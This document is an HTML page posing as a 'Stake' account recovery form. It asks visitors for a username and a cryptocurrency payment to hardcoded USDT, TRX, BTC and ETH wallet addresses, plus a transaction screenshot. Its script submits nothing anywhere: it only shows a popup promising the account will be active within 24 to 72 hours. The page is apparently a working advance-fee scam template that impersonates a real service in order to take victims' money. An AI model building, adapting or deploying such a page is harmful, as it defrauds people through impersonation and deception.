<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Account Recovery</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #121212;
            color: #fff;
            margin: 0;
            padding: 0;
        }

        .container {
            max-width: 600px;
            margin: 0 auto;
            padding: 20px;
            background-color: #1f1f1f;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.5);
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            margin-bottom: 5px;
        }

        .form-group input, .form-group select {
            width: 100%;
            padding: 10px;
            border: 1px solid #333;
            border-radius: 5px;
            background-color: #2c2c2c;
            color: #fff;
        }

        .form-group button {
            width: 100%;
            padding: 10px;
            border: none;
            background-color: #4CAF50;
            color: #fff;
            font-size: 16px;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 10px;
        }

        .form-group button:disabled {
            background-color: #ccc;
            cursor: not-allowed;
        }

        .message {
            text-align: center;
            margin-top: 20px;
            font-size: 16px;
        }

        .popup {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: #1f1f1f;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.5);
        }

        .popup button {
            margin-top: 10px;
            padding: 10px;
            border: none;
            background-color: #4CAF50;
            color: #fff;
            font-size: 16px;
            border-radius: 5px;
            cursor: pointer;
        }

        .popup button:focus {
            outline: none;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="form-group">
            <label for="username">Username</label>
            <input type="text" id="username" placeholder="Enter Username">
            <button id="verifyButton">Verify</button>
            <div id="verifyMessage" style="display:none;">Verifying...</div>
        </div>

        <div class="form-group">
            <label for="coin">Coin</label>
            <select id="coin" onchange="updateAddress()">
                <option value="">Select Coin</option>
                <option value="usdtTRC20">USDT (TRC20)</option>
                <option value="usdtBSC">USDT (BSC)</option>
                <option value="btcBSC">BTC (BSC)</option>
                <option value="trxTRC20">TRX (TRC20)</option>
                <option value="trxBSC">TRX (BSC)</option>
                <option value="ethBSC">Ethereum (BSC)</option>
            </select>
        </div>

        <div class="form-group">
            <label for="network">Network</label>
            <select id="network" onchange="updateAddress()">
                <option value="">Select Network</option>
                <option value="TRC20">TRC20</option>
                <option value="BSC">BSC</option>
            </select>
        </div>

        <div class="form-group">
            <label for="address">Address</label>
            <input type="text" id="address" readonly>
            <button id="copyButton" onclick="copyAddress()">Copy</button>
        </div>

        <div class="form-group">
            <label for="amount">Amount</label>
            <input type="number" id="amount" placeholder="Enter Amount" min="1">
        </div>

        <div class="form-group">
            <label for="screenshot">Transaction Screenshot</label>
            <input type="file" id="screenshot" accept="image/*">
        </div>

        <div class="form-group">
            <button id="submitButton" onclick="submitForm()" disabled>Submit</button>
        </div>

        <div class="message" id="confirmationMessage" style="display:none;">
            <p>Your account recovery request has been received, we forward your quiry in stake team. Your Stake account will be fully active within 24 - 72 hours.</p>
        </div>
    </div>

    <div class="popup" id="popupMessage">
        <p>Your account recovery request has been received by Stake Pass. Your Stake account will be fully active within 24 - 72 hours.</p>
        <button onclick="closePopup()">OK</button>
    </div>

    <script>
        const addresses = {
            usdtTRC20: "TDSyNXKqoanp6aZ14tg4D3ff48vuVjM6qA",
            usdtBSC: "0x4d31c46627c343939e7a02383c2451048a509a0c",
            btcBSC: "0x4d31c46627c343939e7a02383c2451048a509a0c",
            trxTRC20: "TDSyNXKqoanp6aZ14tg4D3ff48vuVjM6qA",
            trxBSC: "0x4d31c46627c343939e7a02383c2451048a509a0c",
            ethBSC: "0x4d31c46627c343939e7a02383c2451048a509a0c"
        };

        function updateAddress() {
            const coin = document.getElementById('coin').value;
            const network = document.getElementById('network').value;
            const addressField = document.getElementById('address');
            
            const addressKey = coin + network;
            if (addresses[addressKey]) {
                addressField.value = addresses[addressKey];
                document.getElementById('copyButton').disabled = false;
            } else {
                addressField.value = '';
                document.getElementById('copyButton').disabled = true;
            }

            enableSubmitButton();
        }

        function copyAddress() {
            const addressField = document.getElementById('address');
            addressField.select();
            document.execCommand('copy');
        }

        function enableSubmitButton() {
            const username = document.getElementById('username').value;
            const coin = document.getElementById('coin').value;
            const network = document.getElementById('network').value;
            const amount = document.getElementById('amount').value;
            const screenshot = document.getElementById('screenshot').files.length;

            if (username && coin && network && amount && screenshot) {
                document.getElementById('submitButton').disabled = false;
            } else {
                document.getElementById('submitButton').disabled = true;
            }
        }

        function submitForm() {
            document.getElementById('popupMessage').style.display = 'block';
        }

        function closePopup() {
            document.getElementById('popupMessage').style.display = 'none';
            location.reload();
        }

        document.getElementById('username').addEventListener('input', enableSubmitButton);
        document.getElementById('coin').addEventListener('change', enableSubmitButton);
        document.getElementById('network').addEventListener('change', enableSubmitButton);
        document.getElementById('amount').addEventListener('input', enableSubmitButton);
        document.getElementById('screenshot').addEventListener('change', enableSubmitButton);
    </script>

</body>
</html>
